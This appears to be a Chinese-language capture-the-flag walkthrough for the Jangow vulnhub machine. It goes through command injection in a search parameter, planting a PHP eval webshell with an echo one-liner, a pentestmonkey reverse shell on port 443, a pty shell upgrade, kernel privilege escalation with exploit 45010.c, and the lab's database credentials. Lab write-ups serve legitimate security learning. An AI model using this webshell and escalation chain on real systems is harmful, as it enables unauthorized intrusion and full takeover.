## Jangow

这里先提前配置一下东西

`这样配置的原因是因为不在一个C段后期的反弹shell监听不到。反正我是这样（我是小白），麻烦大佬勿喷，利用方法有限，正在努力学习中`

这里要用virtualbox打开镜像，在vm里面扫不出来，而且网络设置成仅主机

![image-20220528212145021](vulhub_jangow.assets/image-20220528212145021.png)

攻击机，要设置成桥接模式，外部链接设置virtualbox。

![image-20220528212346612](E:\U盘\靶场\vulhub_jangow.assets\image-20220528212346612.png)

添加两个网络适配器，一个桥接一个NAT，这样前期的配置就ok了

![image-20220528212452787](E:\U盘\靶场\vulhub_jangow.assets\image-20220528212452787.png)

这样将靶机和攻击机打开可以看到在一个C段了

攻击机：192.168.56.102

靶机：192.168.56.101

![image-20220528213001680](E:\U盘\靶场\vulhub_jangow.assets\image-20220528213001680.png)![image-20220528213030932](E:\U盘\靶场\vulhub_jangow.assets\image-20220528213030932.png)

然后就是正常的扫描目标机的开放端口

![image-20220528213259257](E:\U盘\靶场\vulhub_jangow.assets\image-20220528213259257.png)

开放了80端口，访问一下看看

![image-20220528213558163](E:\U盘\靶场\vulhub_jangow.assets\image-20220528213558163.png)

进入site挨个地方都点了一下，发现Buscar后面没有参数

![image-20220528213649257](E:\U盘\靶场\vulhub_jangow.assets\image-20220528213649257.png)

![image-20220528213724735](E:\U盘\靶场\vulhub_jangow.assets\image-20220528213724735.png)

经过尝试发现是命令执行

![image-20220528214143016](E:\U盘\靶场\vulhub_jangow.assets\image-20220528214143016.png)

看到有个busque.php的文件，cat看一下内容

额。。。

![image-20220528214214683](E:\U盘\靶场\vulhub_jangow.assets\image-20220528214214683.png)

继续，我们使用echo 上传一下马

```shell
echo '<?php @eval($_POST['shell']);?>' >> webshell.php
```

![image-20220528214607251](E:\U盘\靶场\vulhub_jangow.assets\image-20220528214607251.png)![image-20220528214617296](E:\U盘\靶场\vulhub_jangow.assets\image-20220528214617296.png)

连接一下

![image-20220528214712921](E:\U盘\靶场\vulhub_jangow.assets\image-20220528214712921.png)

看一下根目录没有发现flag，猜测可能在root目录下，我们没有访问权限

然后先随便翻一下发现了两个账号密码

![image-20220528220401725](E:\U盘\靶场\vulhub_jangow.assets\image-20220528220401725.png)![image-20220528220419499](E:\U盘\靶场\vulhub_jangow.assets\image-20220528220419499.png)

我们用php反弹一下shell

参考地址：https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

在连接工具中改完脚本中的IP和端口后访问这个webshell文件并且监听443端口，

![image-20220528223110863](E:\U盘\靶场\vulhub_jangow.assets\image-20220528223110863.png)

`不知道为什么这里只能443，这里看了wp才知道只能443，有知道的师傅麻烦解惑一下，万分感谢！`

![image-20220528220038356](E:\U盘\靶场\vulhub_jangow.assets\image-20220528220038356.png)

查看一下权限发现是`www-data`权限

![image-20220528220630074](E:\U盘\靶场\vulhub_jangow.assets\image-20220528220630074.png)

切换交互bash

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

我们发现是ubuntu 4.4.0版本

![image-20220528221449553](E:\U盘\靶场\vulhub_jangow.assets\image-20220528221449553.png)

使用searchsploit找一下提权文件

![image-20220528221416728](E:\U盘\靶场\vulhub_jangow.assets\image-20220528221416728.png)

下载一下这个45010.c的文件

![image-20220528221541685](E:\U盘\靶场\vulhub_jangow.assets\image-20220528221541685.png)

因为前期找到了两个账号

```shell
账号1：
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);



账号2：
<?php
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
// Create connection
$conn = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
mysqli_close($conn);
?>
```

又因为开启了21端口，使用ftp连接一下发现账号2连接不上只有账号1能连接上

![image-20220528221942249](E:\U盘\靶场\vulhub_jangow.assets\image-20220528221942249.png)

好像连上没有什么卵用

回到刚才监听的界面使用ssh连接一下

![image-20220528222534561](E:\U盘\靶场\vulhub_jangow.assets\image-20220528222534561.png)

这里解析一下刚才下得45010.c

![image-20220528222716991](E:\U盘\靶场\vulhub_jangow.assets\image-20220528222716991.png)

然后运行一下`exp_shell`

![image-20220528222756515](E:\U盘\靶场\vulhub_jangow.assets\image-20220528222756515.png)

查看一下`root`目录

![image-20220528222838887](E:\U盘\靶场\vulhub_jangow.assets\image-20220528222838887.png)

得到答案

![image-20220528222857379](E:\U盘\靶场\vulhub_jangow.assets\image-20220528222857379.png)